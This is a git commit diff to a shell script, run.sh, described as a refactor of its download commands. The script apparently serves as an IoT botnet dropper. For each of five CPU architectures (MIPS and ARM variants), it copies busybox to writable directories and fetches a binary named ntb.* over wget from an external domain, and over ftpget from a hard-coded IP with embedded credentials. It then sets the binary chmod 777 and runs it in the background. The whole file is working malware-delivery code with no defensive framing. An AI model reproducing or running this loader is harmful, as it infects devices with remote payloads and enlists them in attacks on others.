0cfabd588a00fa598416598d61c54ee022af7a3d
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-06-13 10:00:33 +0400

    Refactor download commands in run.sh
    Replaced multiple wget commands with busybox wget and ftpget for downloading files.

--- wow/old/run.sh
+++ wow/old/run.sh
@@ -1,8 +1,29 @@
 #!/bin/bash
 ulimit -n 65535 2>/dev/null || true
 cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mips; chmod 777 ntb.mips; ./ntb.mips universal &
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mipsel; chmod 777 ntb.mipsel; ./ntb.mipsel universal &
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm64; chmod 777 ntb.arm64; ./ntb.mips universal &
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm6; chmod 777 ntb.arm6; ./ntb.mips universal &
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm7; chmod 777 ntb.arm7; ./ntb.mips universal &
+cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /
+
+busybox wget http://store.risesmp.cc/wow/ntb.mips
+busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mips ntb.mips
+chmod 777 ntb.mips
+./ntb.mips universal &
+
+busybox wget http://store.risesmp.cc/wow/ntb.mipsel
+busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.mipsel ntb.mipsel
+chmod 777 ntb.mipsel
+./ntb.mipsel universal &
+
+busybox wget http://store.risesmp.cc/wow/ntb.arm64
+busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm64 ntb.arm64
+chmod 777 ntb.arm64
+./ntb.arm64 universal &
+
+busybox wget http://store.risesmp.cc/wow/ntb.arm6
+busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm6 ntb.arm6
+chmod 777 ntb.arm6
+./ntb.arm6 universal &
+
+busybox wget http://store.risesmp.cc/wow/ntb.arm7
+busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm7 ntb.arm7
+chmod 777 ntb.arm7
+./ntb.arm7 universal &
